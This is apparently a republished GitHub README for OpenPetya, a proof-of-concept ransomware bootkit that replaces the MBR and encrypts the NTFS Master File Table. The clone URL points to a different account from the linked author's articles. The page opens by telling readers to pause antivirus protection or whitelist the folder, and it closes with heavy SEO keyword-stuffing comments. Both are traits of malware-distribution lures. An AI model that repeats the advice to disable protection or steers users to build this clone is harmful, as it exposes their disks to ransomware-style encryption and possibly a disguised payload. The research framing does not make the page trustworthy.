# OpenPetya


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/SharkEmbroider66/OpenPetya-hub.git
cd OpenPetya-hub
mkdir build && cd build
cmake ..
cmake --build . --config Release
```


A Proof-of-Concept bootkit inspired by Petya ransomware, written in Assembly, C, and C++

<p align="center">
    <img src="https://iss4cf0ng.github.io/images/meme/Rio/4.png" width=200/>
</p>

If you find this project helpful or informative, I would truly appreciate a ⭐ on the repository. Your support would be a great motivation for me to continue improving this tool.

# Overview

OpenPetya is an educational project designed to study how bootkits and low-level ransomware operate internally.

<p align="center">
    <img src="https://iss4cf0ng.github.io/images/article/2026-5-23-OpenPetya/5.png" width=700/>
</p>

The project focuses on:
- custom MBR bootloading
- multi-stage boot process
- Protected Mode transition
- NTFS Master File Table (MFT) encryption
- Salsa20-based cryptography
- password validation and restoration workflow

OpenPetya is **NOT** intended to be an exact reimplementation of either Petya or NotPetya. Instead, it is a simplified Proof-of-Concept designed for learning and research purposes.

It is worth mentioning that OpenPetya does not include Command-and-Control (C2) functionality. In addition, OpenPetya stores plaintext MFT backup data inside hidden sectors after encryption. This behavior is intentionally designed for educational purposes because those features are relatively trival compared to the core bootloader and cryptographic mechanisms implemented in this project. However, you can still modify or remove these features if necessary.

---

# Project Motivation

Over the past few months, I have been studying:
- malware analysis
- bootloaders
- rootkits and bootkits
- Windows internals
- operating system fundamentals
- low-level Assembly programming

While researching Petya and NotPetya, I realized that many online resources only briefly explain the overall workflow without demonstrating how the underlying boot process actually works.

In addition, many existing Petya-related projects rely on extracted bootloader binaries or modified original components rather than implementing the logic from scratch.

Therefore, I decided to develop OpenPetya as a practical project for understanding:
- how custom MBR bootkits work
- how stage-2 bootloaders operate
- how disk encryption workflows function
- how password validation and restoration mechanisms are implemented

The project also serves as part of my ongoing research into bootkits, low-level malware, and operating system internals.

Related articles:
- [Analyzing Petya](https://iss4cf0ng.github.io/2026/04/12/2026-4-12-Petya/)
- [Analyzing NotPetya](https://iss4cf0ng.github.io/2026/04/13/2026-4-13-NotPetya/)
- [Simple MBR And Bootloader](https://iss4cf0ng.github.io/2026/04/08/2026-4-8-MbrAndBootLoader/)
- [OpenBootloader](https://iss4cf0ng.github.io/2026/05/10/2026-5-10-OpenBootloader/)
- [Rootkits and Bootkits Notes](https://iss4cf0ng.github.io/2026/04/28/2026-4-28-RootkitAndBootkit/)
- [PC Assembly Language Notes](https://iss4cf0ng.github.io/2026/04/21/2026-4-21-PcAsmLang/)
- [Serious Cryptography Notes](https://iss4cf0ng.github.io/2026/05/16/2026-5-16-SeriousCryptography/)

---

# Features

- **Custom MBR**
  
  OpenPetya uses a custom Master Boot Record (MBR) to load the stage-2 payload.

- **Custom Stage-2 Bootloader**
  
  The stage-2 bootloader contains the core functionality of the project, including:
  - Salsa20 encryption/decryption
  - password validation
  - restoration logic
  - user interface

- **Protected Mode Transition**
  
  The bootloader switches from 16-bit Real Mode to 32-bit Protected Mode before executing higher-level logic.

- **MFT Encryption**
  
  Similar to the original Petya, OpenPetya encrypts critical parts of the NTFS Master File Table (MFT) using Salsa20.

- **Password Validation**
  
  OpenPetya validates the input password before decryption to prevent irreversible corruption caused by invalid keys.

- **Automatic Restoration**
  
  Once the correct password is entered:
  - encrypted data is restored
  - the original boot chain is recovered
  - OpenPetya removes itself automatically

---

# Components

## `OpenPetya.exe`

User-mode installer and controller application.

Functions:
- drive selection
- installation
- reboot triggering
- utility interface

## `mbr.bin`

Custom Master Boot Record (MBR) code responsible for:
- stage-2 loading
- early boot execution

## `stage2.bin`

The core payload of OpenPetya.

Responsibilities:
- Protected Mode transition
- Salsa20 cryptographic operations
- MFT encryption/decryption
- password validation
- restoration
- boot-time interface

---

# Workflow

The workflow of OpenPetya is summarized below.

   - encrypted data is decrypted
   - the original boot chain is restored
   - OpenPetya removes itself automatically

> Unlike the original Petya ransomware, OpenPetya does not attempt to deceive users with fake CHKDSK screens or social engineering behavior. The project is designed purely for educational and research purposes.

---


# Technical Notes

Detailed explanations about:
- MBR boot process
- Real Mode and Protected Mode
- Salsa20 implementation
- MFT encryption workflow
- bootkit design
- More discussions about Petya and NotPetya
- How to use undocumented APIs (such as `NtRaiseHardError`)

Are documented in [this article](https://iss4cf0ng.github.io/2026/05/23/2026-5-23-OpenPetya/).

# Disclaimer

This project was developed purely for educational and research purposes.

The goal of OpenPetya is to study:

- bootkits
- operating system internals
- low-level malware techniques
- bootloader architecture

Do **NOT** use this project for illegal activities or against systems you do not own or explicitly have permission to test.

The author is **NOT** responsible for any misuse of this software.

# Demonstration (Windows 7)

## Screenshots

<p align="center">
    <img src="https://iss4cf0ng.github.io/images/article/2026-5-23-OpenPetya/4.png" width=800/>
</p>


# Future Plans

- Improved recovery workflow
- Better NTFS parsing
- More accurate Petya behavior simulation
- UEFI experiments
- Additional bootkit research
- Full-screen Graphics Mode
- Windows 10 support

# Thanks

Thanks for checking out this project. Feedback and suggestions are welcome.

<!-- c++ cpp cmake native performance library framework windows linux macos -->
<!-- OpenPetya-hub - tool utility software - download install setup -->
<!-- quickstart OpenPetya-hub optimizer | how to run OpenPetya-hub tracker | beginner OpenPetya-hub utility | how to use low latency OpenPetya-hub | github OpenPetya-hub software | safe OpenPetya-hub web | OpenPetya-hub client | open source OpenPetya-hub validator | zip OpenPetya-hub scanner | latest version production ready OpenPetya-hub | best OpenPetya-hub alternative | tutorial secure OpenPetya-hub | examples OpenPetya-hub creator | zip production ready OpenPetya-hub | documentation OpenPetya-hub | open source OpenPetya-hub cli | how to deploy OpenPetya-hub desktop | self hosted OpenPetya-hub editor | OpenPetya-hub tester | fast OpenPetya-hub encoder | OpenPetya-hub replacement | how to build OpenPetya-hub decoder | run on mac lightweight OpenPetya-hub viewer | how to configure offline OpenPetya-hub | how to install OpenPetya-hub analyzer | configure OpenPetya-hub creator | centos OpenPetya-hub gui | native OpenPetya-hub decoder | reliable OpenPetya-hub wrapper | run on mac secure OpenPetya-hub | OpenPetya-hub copy | use OpenPetya-hub | how to configure OpenPetya-hub platform | how to deploy OpenPetya-hub | run on linux low latency OpenPetya-hub | open source OpenPetya-hub checker | how to install OpenPetya-hub | 2025 OpenPetya-hub gui | how to install customizable OpenPetya-hub | secure OpenPetya-hub library | configure minimal OpenPetya-hub | local OpenPetya-hub downloader | how to download OpenPetya-hub scanner | secure OpenPetya-hub compressor | OpenPetya hub course | wiki OpenPetya-hub | free OpenPetya-hub web | OpenPetya hub workshop | easy OpenPetya-hub app | run on linux OpenPetya-hub alternative -->
<!-- stable OpenPetya-hub | documentation OpenPetya-hub engine | git clone OpenPetya-hub | run on linux OpenPetya-hub debugger | how to install OpenPetya-hub clone | simple OpenPetya-hub application | docs OpenPetya-hub parser | examples cross platform OpenPetya-hub builder | powerful OpenPetya-hub clone | getting started OpenPetya-hub gui | walkthrough OpenPetya-hub reader | secure OpenPetya-hub replacement | production ready OpenPetya-hub converter | macos github OpenPetya-hub | how to use OpenPetya-hub tool | how to download OpenPetya-hub | example safe OpenPetya-hub | OpenPetya-hub api | modern OpenPetya-hub downloader | OpenPetya-hub gui | high performance OpenPetya-hub compressor | use OpenPetya-hub library | download for mac OpenPetya-hub encoder | OpenPetya hub review | OpenPetya-hub desktop | OpenPetya-hub port | getting started OpenPetya-hub application | compile OpenPetya-hub compressor | debian OpenPetya-hub | safe OpenPetya-hub port | example OpenPetya-hub creator | powerful OpenPetya-hub | install OpenPetya-hub monitor | run on linux OpenPetya-hub | getting started reliable OpenPetya-hub platform | run on windows OpenPetya-hub validator | fedora easy OpenPetya-hub | run on mac safe OpenPetya-hub | beginner free OpenPetya-hub | new version OpenPetya-hub compressor | OpenPetya-hub service | example OpenPetya-hub | modern OpenPetya-hub web | free download OpenPetya-hub library | how to configure OpenPetya-hub debugger | arch OpenPetya-hub checker | free OpenPetya-hub module | getting started portable OpenPetya-hub | wiki github OpenPetya-hub | free OpenPetya hub -->
<!-- new version OpenPetya-hub wrapper | 2025 OpenPetya-hub desktop | run on linux OpenPetya-hub analyzer | wiki OpenPetya-hub encoder | configurable OpenPetya-hub mobile | open OpenPetya-hub | beginner OpenPetya-hub addon | start OpenPetya-hub | deploy OpenPetya-hub | OpenPetya-hub mobile | 2025 OpenPetya-hub debugger | minimal OpenPetya-hub software | OpenPetya hub bug | how to install OpenPetya-hub tracker | documentation secure OpenPetya-hub tester | fast OpenPetya-hub | how to run offline OpenPetya-hub framework | quick start OpenPetya-hub editor | run on mac OpenPetya-hub port | OpenPetya hub setup | secure OpenPetya-hub copy | examples OpenPetya-hub api | run OpenPetya-hub converter | modular OpenPetya-hub optimizer | powerful OpenPetya-hub addon | how to setup OpenPetya-hub extension | download OpenPetya-hub library | tar.gz online OpenPetya-hub cli | beginner OpenPetya-hub tester | examples stable OpenPetya-hub | production ready OpenPetya-hub mirror | download for mac OpenPetya-hub converter | 2025 OpenPetya-hub copy | examples OpenPetya-hub | fedora offline OpenPetya-hub validator | OpenPetya-hub validator | fedora OpenPetya-hub checker | safe OpenPetya-hub clone | self hosted OpenPetya-hub server | github OpenPetya-hub package | github OpenPetya-hub clone | advanced OpenPetya-hub | easy OpenPetya-hub binding | OpenPetya hub handbook | tar.gz OpenPetya-hub wrapper | cross platform OpenPetya-hub viewer | build OpenPetya-hub checker | setup OpenPetya-hub reader | run on mac OpenPetya-hub downloader | OpenPetya hub workflow -->
<!-- low latency OpenPetya-hub downloader | install OpenPetya-hub parser | run on windows OpenPetya-hub extension | is OpenPetya hub legit | how to configure configurable OpenPetya-hub | github OpenPetya-hub encoder | free download OpenPetya-hub | how to configure OpenPetya-hub | run on windows OpenPetya-hub | 2026 cross platform OpenPetya-hub | tar.gz advanced OpenPetya-hub | docs customizable OpenPetya-hub desktop | setup OpenPetya-hub generator | sample OpenPetya-hub | fedora cross platform OpenPetya-hub | guide OpenPetya-hub tester | zip OpenPetya-hub clone | production ready OpenPetya-hub clone | setup powerful OpenPetya-hub | fedora stable OpenPetya-hub monitor | guide OpenPetya-hub | free OpenPetya-hub | customizable OpenPetya-hub mirror | OpenPetya-hub fork | latest version OpenPetya-hub application | OpenPetya-hub framework | tar.gz configurable OpenPetya-hub | OpenPetya hub blog | download OpenPetya-hub extension | latest version OpenPetya-hub tracker | run native OpenPetya-hub | how to setup OpenPetya-hub logger | is OpenPetya hub good | modular OpenPetya-hub | macos OpenPetya-hub extension | run on mac OpenPetya-hub | wiki OpenPetya-hub downloader | OpenPetya-hub utility | docs OpenPetya-hub utility | zip secure OpenPetya-hub server | fedora modern OpenPetya-hub copy | build OpenPetya-hub tracker | portable OpenPetya-hub generator | sample OpenPetya-hub alternative | example OpenPetya-hub library | OpenPetya hub best practice | OpenPetya hub devops | modern OpenPetya-hub fork | best OpenPetya hub | download for mac OpenPetya-hub mobile -->
<!-- lightweight OpenPetya-hub service | how to use OpenPetya-hub optimizer | source code OpenPetya-hub framework | run easy OpenPetya-hub | execute OpenPetya-hub builder | get OpenPetya-hub gui | docs online OpenPetya-hub framework | demo OpenPetya-hub | github OpenPetya-hub server | free OpenPetya-hub extractor | tar.gz free OpenPetya-hub application | download safe OpenPetya-hub service | OpenPetya-hub generator | OpenPetya hub demo | docs OpenPetya-hub | run OpenPetya-hub tester | powerful OpenPetya-hub viewer | github OpenPetya-hub | wiki configurable OpenPetya-hub port | customizable OpenPetya-hub | offline OpenPetya-hub encoder | best OpenPetya-hub | extensible OpenPetya-hub mobile | free OpenPetya-hub decoder | how to setup OpenPetya-hub plugin | github OpenPetya-hub web | lightweight OpenPetya-hub editor | new version OpenPetya-hub | download for windows OpenPetya-hub validator | windows OpenPetya-hub analyzer | how to install OpenPetya-hub utility | fedora OpenPetya-hub wrapper | how to install fast OpenPetya-hub encoder | OpenPetya hub help | OpenPetya hub book | centos OpenPetya-hub | github extensible OpenPetya-hub | how to use OpenPetya-hub program | latest version OpenPetya-hub port | extensible OpenPetya-hub viewer | cross platform OpenPetya-hub addon | local OpenPetya-hub engine | production ready OpenPetya-hub | install OpenPetya-hub | guide lightweight OpenPetya-hub | how to run OpenPetya-hub | run github OpenPetya-hub | download for linux portable OpenPetya-hub library | OpenPetya-hub sdk | linux OpenPetya-hub copy -->
<!-- 2026 OpenPetya-hub alternative | wiki cross platform OpenPetya-hub library | run on linux OpenPetya-hub generator | download for windows OpenPetya-hub mirror | configure OpenPetya-hub fork | sample OpenPetya-hub parser | launch OpenPetya-hub | arch safe OpenPetya-hub replacement | download for windows OpenPetya-hub client | get OpenPetya-hub editor | online OpenPetya-hub sdk | extensible OpenPetya-hub alternative | new version best OpenPetya-hub debugger | macos stable OpenPetya-hub mirror | wiki OpenPetya-hub fork | free download OpenPetya-hub cli | download for linux OpenPetya-hub platform | linux OpenPetya-hub | OpenPetya hub benchmark | sample OpenPetya-hub tracker | example OpenPetya-hub api | OpenPetya hub project | tar.gz OpenPetya-hub engine | lightweight OpenPetya-hub package | reliable OpenPetya-hub mirror | updated fast OpenPetya-hub | free OpenPetya-hub parser | quickstart top OpenPetya-hub | download for linux OpenPetya-hub mobile | setup OpenPetya-hub builder | get stable OpenPetya-hub | build OpenPetya-hub | launch advanced OpenPetya-hub compressor | linux OpenPetya-hub generator | open source OpenPetya-hub binding | download for linux OpenPetya-hub wrapper | centos OpenPetya-hub editor | high performance OpenPetya-hub extension | open OpenPetya-hub framework | examples OpenPetya-hub program | download OpenPetya-hub checker | updated cross platform OpenPetya-hub debugger | execute OpenPetya-hub | simple OpenPetya-hub fork | 2025 OpenPetya-hub cli | fast OpenPetya-hub api | download for windows OpenPetya-hub clone | secure OpenPetya-hub | compile OpenPetya-hub | open source OpenPetya-hub client -->
<!-- open source OpenPetya-hub extractor | git clone OpenPetya-hub gui | OpenPetya-hub clone | ubuntu OpenPetya-hub package | debian extensible OpenPetya-hub | OpenPetya-hub library | advanced OpenPetya-hub fork | OpenPetya hub alternative | offline OpenPetya-hub | self hosted OpenPetya-hub addon | portable OpenPetya-hub | OpenPetya-hub builder | build modern OpenPetya-hub service | beginner OpenPetya-hub monitor | documentation github OpenPetya-hub | windows OpenPetya-hub module | use OpenPetya-hub builder | download for mac OpenPetya-hub | lightweight OpenPetya-hub plugin | deploy OpenPetya-hub parser | build self hosted OpenPetya-hub | OpenPetya-hub cli | run on mac simple OpenPetya-hub | powerful OpenPetya-hub parser | secure OpenPetya-hub builder | is OpenPetya hub safe | macos modular OpenPetya-hub | example OpenPetya-hub engine | safe OpenPetya-hub copy | setup OpenPetya-hub | install reliable OpenPetya-hub library | free download OpenPetya-hub program | launch OpenPetya-hub validator | demo OpenPetya-hub analyzer | OpenPetya hub guide | zip open source OpenPetya-hub | get OpenPetya-hub | windows OpenPetya-hub | deploy OpenPetya-hub platform | use OpenPetya-hub downloader | lightweight OpenPetya-hub extractor | 2025 OpenPetya-hub | OpenPetya-hub wrapper | documentation OpenPetya-hub tool | beginner OpenPetya-hub checker | docs OpenPetya-hub logger | safe OpenPetya-hub decoder | new version offline OpenPetya-hub | demo OpenPetya-hub uploader | extensible OpenPetya-hub -->
<!-- how to build OpenPetya-hub | configure OpenPetya-hub debugger | top OpenPetya-hub | configure portable OpenPetya-hub | tar.gz OpenPetya-hub downloader | OpenPetya hub webinar | use secure OpenPetya-hub | github OpenPetya-hub framework | 2025 native OpenPetya-hub | docs OpenPetya-hub program | github OpenPetya-hub app | guide OpenPetya-hub analyzer | deploy github OpenPetya-hub debugger | updated OpenPetya-hub extractor | online OpenPetya-hub extension | best OpenPetya-hub program | tutorial OpenPetya-hub creator | git clone customizable OpenPetya-hub compressor | reliable OpenPetya-hub web | powerful OpenPetya-hub software | download OpenPetya-hub binding | how to run OpenPetya-hub framework | open OpenPetya-hub reader | quickstart OpenPetya-hub copy | portable OpenPetya-hub wrapper | OpenPetya hub cloud | macos OpenPetya-hub module | tutorial OpenPetya-hub replacement | new version OpenPetya-hub framework | open lightweight OpenPetya-hub | git clone OpenPetya-hub clone | reliable OpenPetya-hub app | documentation OpenPetya-hub library | configure top OpenPetya-hub utility | powerful OpenPetya-hub editor | safe OpenPetya-hub framework | cross platform OpenPetya-hub | how to setup OpenPetya-hub creator | walkthrough OpenPetya-hub web | reliable OpenPetya-hub tracker | high performance OpenPetya-hub monitor | production ready OpenPetya-hub replacement | self hosted OpenPetya-hub web | lightweight OpenPetya-hub | new version OpenPetya-hub fork | updated OpenPetya-hub | tutorial OpenPetya-hub | reliable OpenPetya-hub | OpenPetya-hub mirror | how to setup easy OpenPetya-hub -->
<!-- example OpenPetya-hub wrapper | guide OpenPetya-hub builder | cross platform OpenPetya-hub debugger | OpenPetya hub automation | github OpenPetya-hub alternative | OpenPetya hub example | deploy OpenPetya-hub module | arch OpenPetya-hub generator | OpenPetya-hub software | execute OpenPetya-hub extension | OpenPetya hub cheat sheet | compile OpenPetya-hub platform | how to run lightweight OpenPetya-hub | windows OpenPetya-hub program | configure OpenPetya-hub | OpenPetya hub vs | quickstart best OpenPetya-hub optimizer | macos OpenPetya-hub engine | github OpenPetya-hub engine | open source OpenPetya-hub | best OpenPetya-hub cli | launch OpenPetya-hub reader | arch OpenPetya-hub engine | how to configure OpenPetya-hub viewer | open source OpenPetya-hub package | modular OpenPetya-hub reader | run OpenPetya-hub port | open source OpenPetya-hub fork | safe OpenPetya-hub binding | ubuntu OpenPetya-hub creator | execute OpenPetya-hub tool | offline OpenPetya-hub tester | 2026 OpenPetya-hub | how to use OpenPetya-hub sdk | how to install OpenPetya-hub creator | run on mac OpenPetya-hub utility | demo modular OpenPetya-hub | download for mac OpenPetya-hub plugin | portable OpenPetya-hub library | demo OpenPetya-hub fork | OpenPetya-hub viewer | high performance OpenPetya-hub | example github OpenPetya-hub | OpenPetya hub ci cd | configurable OpenPetya-hub port | OpenPetya-hub monitor | configurable OpenPetya-hub uploader | how to setup secure OpenPetya-hub | how to deploy OpenPetya-hub application | run on mac offline OpenPetya-hub -->
<!-- OpenPetya hub test | deploy OpenPetya-hub engine | OpenPetya hub reference | download for windows OpenPetya-hub scanner | OpenPetya-hub engine | how to run OpenPetya-hub sdk | wiki OpenPetya-hub cli | best OpenPetya-hub analyzer | how to download OpenPetya-hub reader | configurable OpenPetya-hub | open OpenPetya-hub compressor | execute OpenPetya-hub gui | how to install modular OpenPetya-hub | customizable OpenPetya-hub monitor | reliable OpenPetya-hub plugin | secure OpenPetya-hub desktop | how to configure OpenPetya-hub copy | latest version customizable OpenPetya-hub | simple OpenPetya-hub compressor | fedora OpenPetya-hub | how to use safe OpenPetya-hub | top OpenPetya-hub gui | fast OpenPetya-hub application | production ready OpenPetya-hub utility | minimal OpenPetya-hub | OpenPetya hub support | github OpenPetya-hub creator | quick start OpenPetya-hub optimizer | how to use free OpenPetya-hub | self hosted OpenPetya-hub cli | reliable OpenPetya-hub generator | new version OpenPetya-hub reader | start easy OpenPetya-hub | offline OpenPetya-hub web | OpenPetya-hub web | linux OpenPetya-hub framework | tutorial top OpenPetya-hub | tutorial OpenPetya-hub gui | how to configure OpenPetya-hub reader | easy OpenPetya-hub | how to use portable OpenPetya-hub viewer | how to build OpenPetya-hub framework | wiki OpenPetya-hub debugger | run OpenPetya-hub | online OpenPetya-hub api | safe OpenPetya-hub encoder | updated OpenPetya-hub fork | OpenPetya-hub binding | demo OpenPetya-hub program | configurable OpenPetya-hub wrapper -->

<!-- Last updated: 2026-06-09 19:04:56 -->
